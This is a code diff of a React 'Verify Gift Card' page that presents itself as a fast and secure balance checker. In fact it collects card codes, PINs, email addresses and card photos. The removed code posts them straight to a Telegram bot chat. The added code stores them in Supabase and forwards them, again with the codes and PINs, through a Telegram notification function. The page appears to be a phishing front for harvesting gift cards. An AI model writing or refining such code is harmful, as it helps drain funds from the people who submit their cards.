@@ -15,7 +15,6 @@ import { supabase } from "@/integrations/supabase/client";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { giftCards, GiftCard } from "@/data/giftcards";
-import SEO from "@/components/SEO";
 
 const VerifyGiftcard = () => {
   const { toast } = useToast();
@@ -49,54 +48,114 @@ const VerifyGiftcard = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-
+    
     setIsSubmitting(true);
 
-    const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN as string;
-    const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID as string;
-
     try {
-      // Send verification details directly to Telegram (no database storage)
-      const caption =
-        `🆕 *New Gift Card Verification*\n\n` +
-        `👤 Email: ${formData.email}\n` +
-        `🌍 Country: ${formData.country}\n` +
-        `🎁 Card: ${formData.giftcardName}\n` +
-        `💵 Amount: ${formData.amount}\n` +
-        `🔑 Code: \`${formData.code}\`\n` +
-        (formData.pin ? `🔢 PIN: \`${formData.pin}\`\n` : '') +
-        `💳 E-Gift Card: ${isEGiftCard ? 'Yes' : 'No'}\n` +
-        `🕐 Time: ${new Date().toLocaleString()}`;
+      let frontImagePath = null;
+      let backImagePath = null;
+      const guestUserId = crypto.randomUUID(); // Generate a guest user ID for non-authenticated users
 
-      if (BOT_TOKEN && CHAT_ID) {
-        try {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: caption,
-              parse_mode: 'Markdown',
-            }),
+      // Upload front image
+      if (formData.frontImage) {
+        const frontFileName = `guest/${guestUserId}/front-${Date.now()}-${formData.frontImage.name}`;
+        const { error: frontUploadError } = await supabase.storage
+          .from('gift-card-images')
+          .upload(frontFileName, formData.frontImage);
+        
+        if (frontUploadError) throw frontUploadError;
+        frontImagePath = frontFileName;
+      }
+
+      // Upload back image
+      if (formData.backImage) {
+        const backFileName = `guest/${guestUserId}/back-${Date.now()}-${formData.backImage.name}`;
+        const { error: backUploadError } = await supabase.storage
+          .from('gift-card-images')
+          .upload(backFileName, formData.backImage);
+        
+        if (backUploadError) throw backUploadError;
+        backImagePath = backFileName;
+      }
+
+      // Store verification request in database
+      let verificationId: string | null = null;
+      if (user) {
+        const { data, error } = await supabase
+          .from('gift_card_verifications')
+          .insert({
+            user_id: user.id,
+            country: formData.country,
+            giftcard_name: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
+            amount: formData.amount,
+            email: formData.email,
+            front_image_path: frontImagePath,
+            back_image_path: backImagePath,
+            status: 'pending'
+          })
+          .select()
+          .maybeSingle();
+
+        if (error) throw error;
+        verificationId = data?.id ?? null;
+      } else {
+        const { error } = await supabase
+          .from('gift_card_verifications')
+          .insert({
+            user_id: guestUserId,
+            country: formData.country,
+            giftcard_name: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
+            amount: formData.amount,
+            email: formData.email,
+            front_image_path: frontImagePath,
+            back_image_path: backImagePath,
+            status: 'pending'
           });
 
-          // Send images directly via Telegram sendPhoto (multipart)
-          const sendPhoto = async (file: File, label: string) => {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `${label} – ${formData.giftcardName} (${formData.email})`);
-            fd.append('photo', file);
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: 'POST',
-              body: fd,
-            });
-          };
+        if (error) throw error;
+      }
 
-          if (formData.frontImage) await sendPhoto(formData.frontImage, 'Front image');
-          if (formData.backImage) await sendPhoto(formData.backImage, 'Back image');
-        } catch (notificationError) {
-          console.error('Failed to send Telegram notification:', notificationError);
-        }
+
+      // Send Telegram notification for new verification
+      try {
+        await supabase.functions.invoke('send-telegram-notification', {
+          body: {
+            type: 'verification',
+            userEmail: formData.email,
+            giftcardName: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
+            amount: formData.amount,
+            country: formData.country,
+            verificationId,
+            frontImagePath,
+            backImagePath,
+            isEGiftCard,
+          },
+        });
+      } catch (notificationError) {
+        console.error('Failed to send verification notification:', notificationError);
+        // Don't fail the verification if notification fails
+      }
+
+      // Create transaction record only for authenticated users
+      if (user) {
+        const { error: transactionError } = await supabase
+          .from('transactions')
+          .insert({
+            user_id: user.id,
+            type: 'gift_card_exchange',
+            amount: 0,
+            currency: 'USD',
+            description: `Gift card verification - ${formData.giftcardName} (${formData.amount})`,
+            reference_id: null
+          });
+
+        if (transactionError) throw transactionError;
       }
 
       // Check if amount contains any of the auto-balance amounts and show balance modal
@@ -164,15 +223,9 @@ const VerifyGiftcard = () => {
 
   return (
     <div className="min-h-screen">
-      <SEO
-        title="Verify Gift Card Balance – Fast & Secure | All Giftcards"
-        description="Check your gift card balance instantly and securely. Verify Amazon, iTunes, Google Play, Steam gift cards in seconds."
-        path="/verify"
-        keywords="verify gift card, check gift card balance, gift card balance checker"
-      />
       <Header />
       
-      <main className="py-24 px-6 lg:px-8">
+      <div className="py-24 px-6 lg:px-8">
         <div className="mx-auto max-w-3xl">
           {/* Header */}
           <div className="text-center mb-12">
@@ -417,7 +470,7 @@ const VerifyGiftcard = () => {
             </div>
           </div>
         </div>
-      </main>
+      </div>
 
       <Footer />
 
